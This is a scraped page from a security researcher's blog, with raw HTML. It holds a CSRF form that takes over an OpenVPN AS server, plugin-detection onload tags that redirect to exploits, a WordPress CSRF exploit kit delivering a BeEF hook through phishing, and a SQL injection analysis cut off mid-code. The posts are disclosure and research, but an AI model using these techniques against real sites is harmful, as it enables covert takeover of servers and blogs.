						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e60dd634771286-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"https://192.168.1.133/admin/authentication_general_configuration"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">enctype</span><span class="crayon-o">=</span><span class="crayon-s">"multipart/form-data"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60dd634771286-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"button"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"Update&amp;#32;Running&amp;#32;Server"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60dd634771286-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"auth&amp;#46;module&amp;#46;type"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"local"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60dd634771286-4"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0027 seconds] -->
<p>If we do a CSRF attack against a target using these 3 requests(Which can be done with the method described in my post about <a title="Two-stage CSRF attacks" href="http://ceriksen.com/2012/09/29/two-stage-csrf-attacks/">multi-stage CSRF attacks</a>), we can then authenticate to the OpenVPN AS admin interface using the account details csrfaccount/qweasd. This further allows us to take over the server.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>, <a href="http://ceriksen.com/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/csrf/" rel="tag">CSRF</a>, <a href="http://ceriksen.com/tag/openvpn/" rel="tag">OpenVPN</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/#respond" title="Comment on CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-256 -->

				
					
<article id="post-249" class="post-249 post type-post status-publish format-standard hentry category-security tag-csrf">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/" title="10:23 pm" rel="bookmark" class="entry-date"><time datetime="2013-05-03T22:23:43+00:00" pubdate>May 3, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/" title="Permalink to Conditional CSRF &#8211; Or how to spray without praying" rel="bookmark">Conditional CSRF &#8211; Or how to spray without praying</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p>A part of the goal of my latest project, <a title="WordPress CSRF Exploit kit â A novel approach to exploiting WordPress plugins" href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/" target="_blank">WordPress CSRF Exploit kit â A novel approach to exploiting WordPress plugins</a>, was to show some novel techniques that I&#8217;ve been picking up on in terms of exploitation of web applications and delivering payloads in neat ways. One goal specifically was to deliver an array of different potential payloads depending on specific conditions and not spray and pray. The one that is the most obvious, is whether or not the target has a specific plugin installed. My approach ended up being a somewhat obscure but neat one that others have documented before. Specifically, the onload/onerror attribute on certain HTML elements that pull in outside resources. Lets deconstruct a landing page as you&#8217;d see it from the above project:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e6ac3759441194" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;image src="http://192.168.1.116/wordpress/wp-content/plugins/all-in-one-webmaster/images/fail.jpg" width="0" height="0"  onload="window.location = '/pi2Y4fcVY7fRHjo';"&gt;
&lt;script src="http://192.168.1.116/wordpress/wp-content/plugins/easy-adsense-lite/wz_tooltip.js" onload="window.location = '/105BTlRREjf4E4F';"&gt;&lt;/script&gt;
&lt;image src="http://192.168.1.116/wordpress/wp-content/plugins/wp-downloadmanager/images/drive.png" width="0" height="0"  onload="window.location = '/E36LAz5PgUlSDzt';"&gt;
&lt;image src="http://192.168.1.116/wordpress/wp-content/plugins/wp-print/images/print.gif" width="0" height="0"  onload="window.location = '/xQEMYQu2lOGPXAf';"&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e6ac3759441194-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e6ac3759441194-2">2</div><div class="crayon-num" data-line="crayon-53c98772e6ac3759441194-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e6ac3759441194-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e6ac3759441194-1"><span class="crayon-o">&lt;</span><span class="crayon-e">image </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.1.116/wordpress/wp-content/plugins/all-in-one-webmaster/images/fail.jpg"</span><span class="crayon-h"> </span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">onload</span><span class="crayon-o">=</span><span class="crayon-s">"window.location = '/pi2Y4fcVY7fRHjo';"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e6ac3759441194-2"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">src</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.1.116/wordpress/wp-content/plugins/easy-adsense-lite/wz_tooltip.js"</span><span class="crayon-h"> </span><span class="crayon-e ">onload</span><span class="crayon-o">=</span><span class="crayon-s">"window.location = '/105BTlRREjf4E4F';"</span><span class="crayon-o">&gt;</span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line" id="crayon-53c98772e6ac3759441194-3"><span class="crayon-o">&lt;</span><span class="crayon-e">image </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.1.116/wordpress/wp-content/plugins/wp-downloadmanager/images/drive.png"</span><span class="crayon-h"> </span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">onload</span><span class="crayon-o">=</span><span class="crayon-s">"window.location = '/E36LAz5PgUlSDzt';"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e6ac3759441194-4"><span class="crayon-o">&lt;</span><span class="crayon-e">image </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.1.116/wordpress/wp-content/plugins/wp-print/images/print.gif"</span><span class="crayon-h"> </span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">onload</span><span class="crayon-o">=</span><span class="crayon-s">"window.location = '/xQEMYQu2lOGPXAf';"</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0056 seconds] -->
<p>What we can observe here is a bunch of different image/script tags all pointing to a potential file existing on a remote system which belong to a specific WordPress plugin. In the event that the plugin is not installed on the host, nothing happens. We&#8217;re not loading them for display as I&#8217;m sure you guessed. Rather, we&#8217;re hoping to get the onload attribute invoked, which contains someÂ convenientÂ javascript of ours.</p>
<p>In the event that the vulnerable plugin is detected, in this case we redirect to a page that contains our actual exploit payload. This means we don&#8217;t have to send all possible payloads at once, but can have some obscurity until we know we can hit something interesting. Or in other words, you can spray a target and not have to pray that your exploits work, because they won&#8217;t trigger unless a target has the plugin you&#8217;re targeting.</p>
<p>This approach is not new, as it has been used in the past for things like trying to resolve different host-names/ip/port ranges on an internal network through a hooked browser to scan for other web applications to target. In this case, we&#8217;re using this approach to detect the presence of a vulnerable plugin on a, granted that it&#8217;s a pre-determined, target. By being able to not have to do up-front poking at a running system, we&#8217;re able to achieve a lower turn-around time on delivering a payload that either hits a target or simply just does nothing.</p>
<p>So there you have it. This is probably not an useful approach to take in all cases where you exploit a CSRF vulnerability. But it&#8217;s still an interesting approach and hopefully will inspire others to consider thinking about being more sneaky(Don&#8217;t spray and pray!) in their exploitation attempts and make full use of the wonderful things HTML and javascript offer you!</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/csrf/" rel="tag">CSRF</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/#comments" title="Comment on Conditional CSRF &#8211; Or how to spray without praying">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-249 -->

				
					
<article id="post-238" class="post-238 post type-post status-publish format-standard hentry category-security">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/" title="4:03 pm" rel="bookmark" class="entry-date"><time datetime="2013-05-01T16:03:59+00:00" pubdate>May 1, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/" title="Permalink to WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins" rel="bookmark">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p>Over the last few weeks I&#8217;ve been on roll with finding CSRF vulnerabilities in WordPress plugins. That&#8217;s all nice and good, but when you&#8217;ve got 30 of them, it&#8217;s a shame to not take it a step further and show the dangers of them! This project is solely designed to show off a few random thoughts of mine, and most importantly to hopefully inspire others to think along these lines. This project is solely meant for educational purposes, not attack against running services or people.</p>
<p><a href="https://github.com/CharlieEriksen/WP-CSRF-POC">https://github.com/CharlieEriksen/WP-CSRF-POC</a></p>
<p>The project shows a few basic concepts in regards to the process of pulling off a CSRF attack against a large number of WordPress sites. Some things worth pointing out:</p>
<ul>
<li>It&#8217;s not designed to simply spray and pray. You define the target URLs you want to hit and then you have an unique URL for each blog you can go phishing with.</li>
<li>Then it will use the onload function of an img or script tag to detect the presence of the vulnerable plugin on the target blog on request through the unique URL pre-defined</li>
<li>We generate the payload on request with an uniquely identifying URL to ensure it&#8217;s not easy to extract the exploits.</li>
<li>You get max 2 requests to the script per IP. That is all a compromise needs. After that, you get nothing back. Makes it harder for researchers life</li>
<li>We deliver a <a href="http://beefproject.com/">beef hook</a>. Because beef is cool and god damn tasty</li>
</ul>
<p>I want to stress especially the &#8220;novel&#8221; use of the onload function of img/script tags. People in the past have used it to detect the presence of different host-names/&#8221;port scanning&#8221; internal systems by vectoring through a hooked browser. I say that&#8217;s cool and all, but you can take that further and use it to detect the presence of a plugin on a target on demand, making you able to be much more sneaky. When the markup detects a plugin present on the target, it redirects the browser to the exploit, and no further requests can be made by that IP to the script.</p>
<p>A normal series of events would be:</p>
<ol type="1">
<li><span style="line-height: 13px;">An attacker sets up this script with pre-defined targets(targets variable) with an unique URL for each target blog</span></li>
<li>The attacker then spams out a link to the running script with the unique URL for each target blog</li>
<li>When a target clicks the link to this script, we validate that the URL contains the unique identifier that resolves to a blog URL</li>
<li>The script the generates a random URL for each exploit we have with the target blog URL put in that can then be requested</li>
<li>We output to the user a series of img/script tags with onload attributes that redirect to the unique URL generated in step 4. These tags look for specific plugins on the targeted blog</li>
<li>If none of the plugins are detected on the blog, we redirect to google</li>
<li>If any of the plugins are detected, we redirect to the uniquely generated URL made in step 4</li>
<li>The exploit is now written out to the user, submitting the CSRF with a XSS payload pointing to our beef instance</li>
<li>We now delete all cached exploits made for the requesting IP</li>
</ol>
<p>There&#8217;s a number of improvements that could be made to this. It could be designed to spray and pray through iframes, but that is much much dirtier, and not the goal of this proof of concept. I urge anybody who finds the concept to be useful to run with it if they so desire. I&#8217;ll be adding more exploits as advisories are published. Otherwise, I&#8217;m curious to hear people&#8217;s thoughts on this.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/#comments" title="Comment on WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-238 -->

				
					
<article id="post-217" class="post-217 post type-post status-publish format-standard hentry category-security">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/01/27/vulnerability-chaining-magic-quotes-bypass-with-hexadecimal-literals-and-data-exfiltration/" title="5:05 pm" rel="bookmark" class="entry-date"><time datetime="2013-01-27T17:05:27+00:00" pubdate>January 27, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/01/27/vulnerability-chaining-magic-quotes-bypass-with-hexadecimal-literals-and-data-exfiltration/" title="Permalink to Vulnerability chaining, magic quotes bypass with hexadecimal literals and data exfiltration" rel="bookmark">Vulnerability chaining, magic quotes bypass with hexadecimal literals and data exfiltration</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p>I have a pet peeve. It&#8217;s when people argue that vulnerabilities that exist in an administrator interface, though not inherently critical, does not need to be fixed. Many administrator interfaces assume that if a user has access to it, the user can be explicitly trusted. And that leaves entire applications at a risk that&#8217;s easily fixable, yet developers refuse to acknowledge this.</p>
<p>A such example is what I&#8217;m going to talk about in this blog post more in depth. I already showed an example of a similar issue over <a href="http://ceriksen.com/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/">here</a>. But what happens when you take this sort of triple-joy attack further to its logical conclusion? First though, letâs take a look at the <a href="http://wordpress.org/extend/plugins/wp-easy-gallery/">WP Easy Gallery plugin</a>!</p>
<p><strong>SQL Injection analysis</strong><br />
I first came across this issue through some tools I coded to discover extremely obvious vulnerabilities, which exist all over. It alerted me to the fact that there was a good likelihood of a SQL injection condition existing in the <a href="http://plugins.svn.wordpress.org/wp-easy-gallery/trunk/admin/add-images.php">/admin/add-images.php</a> file. Letâs look!</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e71a9339244106" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
//Select gallery
if(isset($_POST['select_gallery']) || isset($_POST['galleryId'])) {
$gid = (isset($_POST['select_gallery'])) ? $_POST['select_gallery'] : $_POST['galleryId'];
$imageResults = $wpdb-&gt;get_results( "SELECT * FROM $easy_gallery_image_table WHERE gid = $gid ORDER BY sortOrder ASC" );
$gallery = $wpdb-&gt;get_row( "SELECT * FROM $easy_gallery_table WHERE Id = $gid" );
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e71a9339244106-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71a9339244106-2">2</div><div class="crayon-num" data-line="crayon-53c98772e71a9339244106-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71a9339244106-4">4</div><div class="crayon-num" data-line="crayon-53c98772e71a9339244106-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71a9339244106-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e71a9339244106-1"><span class="crayon-c">//Select gallery</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71a9339244106-2"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'select_gallery'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'galleryId'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98772e71a9339244106-3"><span class="crayon-sy">$</span><span class="crayon-v">gid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'select_gallery'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'select_gallery'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'galleryId'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71a9339244106-4"><span class="crayon-sy">$</span><span class="crayon-v">imageResults</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM $easy_gallery_image_table WHERE gid = $gid ORDER BY sortOrder ASC"</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98772e71a9339244106-5"><span class="crayon-sy">$</span><span class="crayon-v">gallery</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM $easy_gallery_table WHERE Id = $gid"</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71a9339244106-6"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0053 seconds] -->
<p>It pulls either the &#8220;select_gallery&#8221; or &#8220;galleryId&#8221; POST parameter. That&#8217;s then passed to two SQL queries without being cast to integers. That&#8217;s clue 1 right there that this is something we need to dig a bit deeper into. The file name is a clue that these pages are most likely not publicly accessible, as well as that there&#8217;s a check at the top of the file to ensure the file isn&#8217;t called directly. So this relies on somebody having access to the admin interface. And the admin needs to be silly enough to insert SQL into a query string parameter, but only blindly. We need to now establish whether or not the SQLi is blind or not.</p>
<p>A good clue is to grep the file for echo statements. Here are some examples:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e71ba111345520" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?php } else if(isset($_POST['select_gallery']) || isset($_POST['galleryId'])) { ?&gt; 
&lt;h3&gt;Gallery: &lt;?php echo $gallery-&gt;name; ?&gt;&lt;/h3&gt;
.....
if(count($imageResults) &gt; 0) {
?&gt;
.....
&lt;p&gt;&lt;strong&gt;Image Path:&lt;/strong&gt; &lt;input type="text" name="edit_imagePath" size="75" value="&lt;?php echo $image-&gt;imagePath; ?&gt;" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Image Title:&lt;/strong&gt; &lt;input type="text" name="edit_imageTitle" size="20" value="&lt;?php echo $image-&gt;title; ?&gt;" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Image Description:&lt;/strong&gt; &lt;input type="text" name="edit_imageDescription" size="75" value="&lt;?php echo $image-&gt;description; ?&gt;" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sort Order:&lt;/strong&gt; &lt;input type="text" name="edit_imageSort" size="10" value="&lt;?php echo $image-&gt;sortOrder; ?&gt;" /&gt;&lt;/p&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e71ba111345520-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71ba111345520-2">2</div><div class="crayon-num" data-line="crayon-53c98772e71ba111345520-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71ba111345520-4">4</div><div class="crayon-num" data-line="crayon-53c98772e71ba111345520-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71ba111345520-6">6</div><div class="crayon-num" data-line="crayon-53c98772e71ba111345520-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71ba111345520-8">8</div><div class="crayon-num" data-line="crayon-53c98772e71ba111345520-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71ba111345520-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e71ba111345520-1"><span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'select_gallery'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'galleryId'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71ba111345520-2"><span class="crayon-o">&lt;</span><span class="crayon-i">h3</span><span class="crayon-o">&gt;</span><span class="crayon-i">Gallery</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$gallery</span><span class="crayon-o">-&gt;</span><span class="crayon-i">name</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">h3</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e71ba111345520-3"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71ba111345520-4"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">count</span><span class="crayon-sy">(</span><span 